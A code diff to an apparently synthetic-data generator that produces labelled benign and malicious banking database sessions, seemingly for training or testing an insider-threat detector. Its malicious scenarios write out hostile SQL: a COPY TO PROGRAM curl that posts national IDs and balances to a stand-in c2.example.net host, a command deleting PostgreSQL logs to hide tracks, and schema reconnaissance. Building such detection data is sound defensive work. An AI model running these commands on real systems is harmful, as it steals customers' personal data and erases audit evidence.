@@ -58,20 +58,39 @@ ALL_TABLES = ["customers", "accounts", "transactions"]
 
 ROLES = ["teller", "branch_manager", "compliance_officer", "batch_etl_service"]
 
-SHARED_IPS = [
-    ("198.51.100.20", 443),   # approved warehouse
+# INTERNAL hosts — legitimate infrastructure (benign destinations)
+INTERNAL_IPS = [
     ("10.0.1.50", 5432),      # internal DB replica
     ("10.0.1.100", 8080),     # internal API
-    ("198.51.100.77", 443),   # near-miss of approved warehouse
-    ("93.184.216.34", 443),   # suspicious external / offsite backup
+    ("10.0.2.10", 5432),      # secondary DB replica
+    ("10.0.1.200", 443),      # internal HTTPS service
+    ("10.0.3.15", 8443),      # internal audit service
+    ("172.16.0.50", 9200),    # Elasticsearch cluster
+    ("172.16.1.10", 443),     # internal vault
+    ("192.168.1.100", 8080),  # branch local server
+    ("198.51.100.20", 443),   # approved data warehouse
+    ("198.51.100.25", 443),   # approved backup service
+]
+
+# EXTERNAL hosts — suspicious / attacker infrastructure (malicious destinations)
+EXTERNAL_IPS = [
+    ("93.184.216.34", 443),   # suspicious external
     ("45.33.12.9", 4444),     # reverse shell endpoint
     ("185.220.101.5", 8443),  # Tor exit node
     ("203.0.113.42", 443),    # external drop site
+    ("198.51.100.77", 443),   # near-miss of approved warehouse
+    ("91.219.236.174", 443),  # foreign VPS
+    ("104.244.72.115", 8080), # bulletproof hosting
+    ("23.129.64.100", 443),   # anonymous proxy
+    ("185.100.87.41", 9443),  # darknet relay
+    ("77.247.181.165", 443),  # offshore server
 ]
-INTERNAL_IPS = SHARED_IPS
-EXTERNAL_IPS = SHARED_IPS
 
-BRANCH_IDS = ["BR-001", "BR-002", "BR-003", "BR-014", "BR-027"]
+BRANCH_IDS = [
+    "BR-001", "BR-002", "BR-003", "BR-014", "BR-027",
+    "BR-005", "BR-008", "BR-011", "BR-019", "BR-022",
+    "BR-031", "BR-035", "BR-042", "BR-050", "BR-063",
+]
 
 
 # ==========================================================================
@@ -99,6 +118,13 @@ def _benign_teller_queries(rng, n=None):
         f"INSERT INTO transactions (account_id, amount, counterparty, transaction_time) VALUES ({rng.randint(10000, 99999)}, {rng.randint(100, 5000)}, 'Customer Transfer', NOW())",
         f"SELECT transaction_id, amount FROM transactions WHERE account_id = {rng.randint(10000, 99999)} ORDER BY transaction_time DESC LIMIT 10",
         f"SELECT full_name, customer_id FROM customers WHERE branch_id = '{_random_branch(rng)}' AND customer_id = {_random_cust_id(rng)}",
+        f"SELECT account_id, account_type, balance FROM accounts WHERE customer_id = {_random_cust_id(rng)}",
+        f"UPDATE accounts SET balance = balance + {rng.randint(100, 10000)} WHERE account_id = {rng.randint(10000, 99999)}",
+        f"SELECT a.account_id, a.balance FROM accounts a WHERE a.customer_id = {_random_cust_id(rng)} AND a.branch_id = '{_random_branch(rng)}'",
+        f"INSERT INTO transactions (account_id, amount, counterparty, transaction_time) VALUES ({rng.randint(10000, 99999)}, -{rng.randint(50, 2000)}, 'Bill Payment', NOW())",
+        f"SELECT t.transaction_id, t.amount, t.counterparty FROM transactions t WHERE t.account_id = {rng.randint(10000, 99999)} AND t.transaction_time > '2026-09-01' ORDER BY t.transaction_time DESC",
+        f"SELECT c.full_name, c.customer_id, a.account_type FROM customers c JOIN accounts a ON a.customer_id = c.customer_id WHERE c.branch_id = '{_random_branch(rng)}' AND c.customer_id = {_random_cust_id(rng)}",
+        f"SELECT COUNT(*) FROM transactions WHERE account_id = {rng.randint(10000, 99999)} AND transaction_time > NOW() - INTERVAL '7 days'",
     ]
     return [rng.choice(pool) for _ in range(n)]
 
@@ -109,6 +135,10 @@ def _benign_manager_queries(rng, n=None):
         f"SELECT a.account_id, a.balance, c.full_name FROM accounts a JOIN customers c ON c.customer_id = a.customer_id WHERE a.branch_id = '{branch}'",
         f"SELECT SUM(amount), COUNT(*) FROM transactions WHERE account_id IN (SELECT account_id FROM accounts WHERE branch_id = '{branch}') AND transaction_time > '2026-09-12'",
         f"SELECT COUNT(*) FROM customers WHERE branch_id = '{branch}'",
+        f"SELECT a.account_type, COUNT(*), SUM(a.balance) FROM accounts a WHERE a.branch_id = '{branch}' GROUP BY a.account_type",
+        f"SELECT c.full_name, a.balance FROM customers c JOIN accounts a ON a.customer_id = c.customer_id WHERE a.branch_id = '{branch}' AND a.balance > {rng.randint(10000, 100000)} ORDER BY a.balance DESC",
+        f"SELECT DATE(t.transaction_time), SUM(t.amount) FROM transactions t JOIN accounts a ON a.account_id = t.account_id WHERE a.branch_id = '{branch}' AND t.transaction_time > NOW() - INTERVAL '30 days' GROUP BY DATE(t.transaction_time)",
+        f"SELECT c.customer_id, c.full_name, COUNT(t.transaction_id) as txn_count FROM customers c JOIN accounts a ON a.customer_id = c.customer_id JOIN transactions t ON t.account_id = a.account_id WHERE a.branch_id = '{branch}' GROUP BY c.customer_id, c.full_name ORDER BY txn_count DESC LIMIT 20",
     ]
     return [rng.choice(pool) for _ in range(n)]
 
@@ -118,6 +148,10 @@ def _compliance_audit_queries(rng, n=None):
         "SELECT c.national_id, c.address, a.balance FROM customers c JOIN accounts a ON a.customer_id = c.customer_id WHERE a.balance > 100000",
         "SELECT c.customer_id, c.national_id, t.amount, t.counterparty FROM customers c JOIN accounts a ON a.customer_id = c.customer_id JOIN transactions t ON t.account_id = a.account_id WHERE t.amount > 50000",
         "SELECT c.full_name, c.national_id, COUNT(t.transaction_id) FROM customers c JOIN accounts a ON a.customer_id = c.customer_id JOIN transactions t ON t.account_id = a.account_id GROUP BY c.customer_id, c.full_name, c.national_id HAVING COUNT(t.transaction_id) > 100",
+        f"SELECT c.national_id, c.address, a.balance, a.account_type FROM customers c JOIN accounts a ON a.customer_id = c.customer_id WHERE a.branch_id = '{_random_branch(rng)}' AND a.balance > {rng.randint(50000, 200000)}",
+        f"SELECT c.customer_id, c.national_id, c.address, SUM(t.amount) as total FROM customers c JOIN accounts a ON a.customer_id = c.customer_id JOIN transactions t ON t.account_id = a.account_id WHERE t.counterparty LIKE '%International%' GROUP BY c.customer_id, c.national_id, c.address HAVING SUM(t.amount) > {rng.randint(100000, 500000)}",
+        "SELECT DISTINCT c.national_id, c.full_name, c.address FROM customers c JOIN accounts a ON a.customer_id = c.customer_id WHERE a.account_type = 'savings' AND a.balance > 250000",
+        f"SELECT c.customer_id, c.national_id, COUNT(DISTINCT a.branch_id) as branch_count FROM customers c JOIN accounts a ON a.customer_id = c.customer_id GROUP BY c.customer_id, c.national_id HAVING COUNT(DISTINCT a.branch_id) > {rng.randint(2, 4)}",
     ]
     return [rng.choice(pool) for _ in range(n)]
 
@@ -527,6 +561,132 @@ def _make_alter_role_escalation(rng, idx) -> dict:
     }
 
 
+def _make_manager_cross_branch_benign(rng, idx) -> dict:
+    """Benign — branch manager legitimately queries multiple branches for regional report."""
+    branches = rng.sample(BRANCH_IDS, min(rng.randint(2, 4), len(BRANCH_IDS)))
+    branch_list = "', '".join(branches)
+    dest = rng.choice(INTERNAL_IPS)
+    return {
+        "scenario_id": f"banking_mgr_cross_branch_{idx:04d}",
+        "family_id": f"banking_mgr_cross_branch_{idx:04d}",
+        "domain": "banking",
+        "time_of_day": f"{rng.randint(9, 16):02d}:{rng.choice(['00', '30'])}",
+        "default_class": "benign",
+        "rule_engine_relationship": "benign_false_positive",
+        "sessions": [{
+            "session_label": "cross_branch_report",
+            "role": "branch_manager",
+            "class": "benign",
+            "anchor": "db",
+            "timing": {"tempo": "steady", "step_gaps_seconds": [rng.uniform(2.0, 6.0)]},
+            "events": [
+                {"sql": f"SELECT a.branch_id, COUNT(*), SUM(a.balance) FROM accounts a WHERE a.branch_id IN ('{branch_list}') GROUP BY a.branch_id"},
+                {"sql": f"SELECT c.full_name, a.balance, a.branch_id FROM customers c JOIN accounts a ON a.customer_id = c.customer_id WHERE a.branch_id IN ('{branch_list}') AND a.balance > {rng.randint(50000, 200000)}"},
+                {"step_id": "report_export",
+                 "sql": f"COPY (SELECT a.branch_id, a.account_type, COUNT(*), SUM(a.balance) FROM accounts a WHERE a.branch_id IN ('{branch_list}') GROUP BY a.branch_id, a.account_type) TO PROGRAM 'curl -sX POST https://reports.internal.example/regional -d @-'",
+                 "connects_to": {"ip": dest[0], "port": dest[1]}},
+            ]
+        }]
+    }
+
+
+def _make_data_tampering_malicious(rng, idx) -> dict:
+    """Malicious — direct UPDATE/DELETE on sensitive customer data to cover tracks."""
+    return {
+        "scenario_id": f"banking_data_tamper_{idx:04d}",
+        "family_id": f"banking_data_tamper_{idx:04d}",
+        "domain": "banking",
+        "time_of_day": f"{rng.choice(['01', '02', '03', '22', '23'])}:{rng.choice(['00', '15', '30', '45'])}",
+        "default_class": "malicious",
+        "rule_engine_relationship": "agrees",
+        "sessions": [{
+            "session_label": "tamper",
+            "role": "teller",
+            "class": "malicious",
+            "anchor": "db",
+            "timing": {"tempo": "bursty", "step_gaps_seconds": [rng.uniform(0.3, 1.5)]},
+            "events": [
+                {"sql": f"UPDATE customers SET address = '123 Fake St' WHERE customer_id = {_random_cust_id(rng)}"},
+                {"sql": f"DELETE FROM transactions WHERE account_id = {rng.randint(10000, 99999)} AND amount > {rng.randint(10000, 50000)}"},
+                {"step_id": "cover_tracks",
+                 "sql": "COPY (SELECT 'cleanup done') TO PROGRAM 'rm -f /var/log/postgresql/postgresql-*.log'"},
+            ]
+        }]
+    }
+
+
+def _make_lateral_movement_malicious(rng, idx) -> dict:
+    """Malicious — queries information_schema for recon, then accesses multiple tables."""
+    dest = rng.choice(EXTERNAL_IPS)
+    return {
+        "scenario_id": f"banking_lateral_move_{idx:04d}",
+        "family_id": f"banking_lateral_move_{idx:04d}",
+        "domain": "banking",
+        "time_of_day": f"{rng.choice(['01', '02', '03', '23'])}:{rng.choice(['00', '15', '30'])}",
+        "default_class": "malicious",
+        "rule_engine_relationship": "malicious_false_negative",
+        "sessions": [
+            {
+                "session_label": "recon",
+                "role": "teller",
+                "class": "malicious",
+                "anchor": "db",
+                "timing": {"tempo": "steady", "step_gaps_seconds": [rng.uniform(2.0, 5.0)]},
+                "events": [
+                    {"sql": "SELECT table_name, column_name FROM information_schema.columns WHERE table_schema = 'public'"},
+                    {"sql": f"SELECT COUNT(*) FROM customers WHERE branch_id = '{_random_branch(rng)}'"},
+                    {"step_id": "probe",
+                     "sql": "COPY (SELECT 'probe') TO PROGRAM 'cat > /dev/null'"},
+                ]
+            },
+            {
+                "session_label": "harvest",
+                "role": "teller",
+                "class": "malicious",
+                "anchor": "db",
+                "delay_after_previous_seconds": rng.uniform(10, 60),
+                "timing": {"tempo": "bursty", "step_gaps_seconds": [rng.uniform(0.5, 2.0)]},
+                "events": [
+                    {"sql": f"SELECT national_id, address, full_name FROM customers"},
+                    {"sql": f"SELECT account_id, balance, customer_id FROM accounts WHERE balance > {rng.randint(50000, 200000)}"},
+                    {"step_id": "exfil",
+                     "sql": f"COPY (SELECT c.national_id, c.address, a.balance FROM customers c JOIN accounts a ON a.customer_id = c.customer_id) TO PROGRAM 'curl -sX POST https://c2.example.net/harvest -d @-'",
+                     "connects_to": {"ip": dest[0], "port": dest[1]}},
+                ]
+            },
+        ]
+    }
+
+
+def _make_batch_report_benign(rng, idx) -> dict:
+    """Benign — scheduled batch report generation to approved internal endpoint."""
+    dest = rng.choice(INTERNAL_IPS)
+    branch = _random_branch(rng)
+    start, end = _random_date_range(rng)
+    return {
+        "scenario_id": f"banking_batch_report_{idx:04d}",
+        "family_id": f"banking_batch_report_{idx:04d}",
+        "domain": "banking",
+        "time_of_day": f"{rng.choice(['00', '01', '05', '06'])}:{rng.choice(['00', '30'])}",
+        "default_class": "benign",
+        "rule_engine_relationship": "agrees",
+        "sessions": [{
+            "session_label": "batch_report",
+            "role": "batch_etl_service",
+            "class": "benign",
+            "anchor": "db",
+            "timing": {"tempo": "steady", "step_gaps_seconds": [rng.uniform(3.0, 8.0)]},
+            "events": [
+                {"sql": f"SELECT a.branch_id, a.account_type, COUNT(*), SUM(a.balance) FROM accounts a WHERE a.branch_id = '{branch}' GROUP BY a.branch_id, a.account_type"},
+                {"sql": f"SELECT COUNT(t.transaction_id), SUM(t.amount) FROM transactions t JOIN accounts a ON a.account_id = t.account_id WHERE a.branch_id = '{branch}' AND t.transaction_time > '{start}' AND t.transaction_time <= '{end}'"},
+                {"step_id": "report_send",
+                 "sql": f"COPY (SELECT a.branch_id, COUNT(*), SUM(a.balance) FROM accounts a WHERE a.branch_id = '{branch}' GROUP BY a.branch_id) TO PROGRAM 'curl -sX POST https://reporting.internal.example/daily -d @-'",
+                 "connects_to": {"ip": dest[0], "port": dest[1]}},
+            ]
+        }]
+    }
+
+
 # ==========================================================================
 # Category registry and run assembly
 # ==========================================================================
@@ -546,6 +706,11 @@ CATEGORY_GENERATORS = [
     (_make_hard_neg_dba_shadow_audit,   1),
     (_make_hard_neg_etl_internal,       2),
     (_make_alter_role_escalation,       1),
+    # --- New categories for diversity ---
+    (_make_manager_cross_branch_benign, 2),
+    (_make_data_tampering_malicious,    2),
+    (_make_lateral_movement_malicious,  1),
+    (_make_batch_report_benign,         2),
 ]
 
 
